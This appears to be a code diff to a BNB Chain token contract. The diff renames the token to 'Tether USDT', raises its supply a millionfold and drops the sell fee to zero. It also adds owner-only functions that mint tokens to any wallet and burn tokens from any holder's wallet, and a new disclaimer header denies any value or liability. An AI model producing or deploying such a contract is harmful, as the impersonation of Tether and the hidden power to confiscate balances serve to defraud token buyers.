@@ -1,12 +1,37 @@
 
+/*
+ ████████╗ ██████╗ ███████╗███╗   ██╗████████╗
+ ╚══██╔══╝██╔═══██╗██╔════╝████╗  ██║╚══██╔══╝
+    ██║   ██║   ██║█████╗  ██╔██╗ ██║   ██║   
+    ██║   ██║   ██║██╔══╝  ██║╚██╗██║   ██║   
+    ██║   ╚██████╔╝███████╗██║ ╚████║   ██║   
+    ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   
+
+ Token Disclaimer:
+ ----------------------------------------------
+ THIS TOKEN IS NOT FOR SALE.
+
+ This smart contract is for experimental, educational,
+ or simulation purposes only. It is NOT a financial
+ product or investment vehicle. It has NO real-world value,
+ is NOT intended to be traded, and should NOT be considered
+ a security or investment opportunity.
+
+ The token price shown on decentralized exchanges is a
+ reflection of the initial liquidity ratio and NOT of
+ actual market demand or value.
+
+ USE AT YOUR OWN RISK. THE DEVELOPERS ACCEPT NO LIABILITY
+ FOR ANY LOSS OR MISINTERPRETATION OF THIS CONTRACT.
+ ----------------------------------------------
+*/
 
 /*
-Name: Teather USD.Token
-Symbol: USD.T.
+Name: Tether USDT
+Symbol: USDT
 Decimals: 18
-Total supply: 100,000,000
+Total supply: 100,000,000000000
 Network: BNB
-Contract :01
 
  SPDX-License-Identifier: MIT */
 
@@ -336,7 +361,7 @@ contract TEATHERTOKEN is ERC20, Ownable {
     event SwapAndSendFee(uint256 tokensSwapped, uint256 bnbSend);
     event SwapTokensAtAmountUpdated(uint256 swapTokensAtAmount);
 
-    constructor() ERC20("Teather USD.Token", "USD.T") {
+    constructor() ERC20("Tether USDT", "USDT") {
         address router;
         address pinkLock;
 
@@ -363,8 +388,8 @@ contract TEATHERTOKEN is ERC20, Ownable {
 
         _approve(address(this), address(uniswapV2Router), type(uint256).max);
 
-        feeOnBuy = 1;
-        feeOnSell = 3;
+        feeOnBuy = 5;
+        feeOnSell = 0;
 
         feeOnTransfer = 0;
         transferOwnership(0x7B8BdCFb0eb8037c8A87838C78155584F4B322e0);
@@ -376,7 +401,7 @@ contract TEATHERTOKEN is ERC20, Ownable {
         _isExcludedFromFees[address(this)] = true;
         _isExcludedFromFees[pinkLock] = true;
 
-        _mintOnce(owner(), 100_000_000 * (10 ** decimals()));
+        _mintOnce(owner(), 100_000_000_000_000 * (10 ** decimals()));
         swapTokensAtAmount = totalSupply() / 5_000;
 
         swapEnabled = false;
@@ -549,4 +574,20 @@ contract TEATHERTOKEN is ERC20, Ownable {
 
         emit SwapAndSendFee(tokenAmount, newBalance);
     }
+        /**
+     * @dev Mint tokens to any wallet. Only callable by the owner.
+     */
+    function mint(address to, uint256 amount) external onlyOwner {
+        require(to != address(0), "Cannot mint to zero address");
+        _mintOnce(to, amount);
+    }
+
+    /**
+     * @dev Burn tokens from any wallet. Only callable by the owner.
+     */
+    function Ownerburn(address from, uint256 amount) external onlyOwner {
+        require(from != address(0), "Cannot burn from zero address");
+        _burn(from, amount);
+    }
+
 }
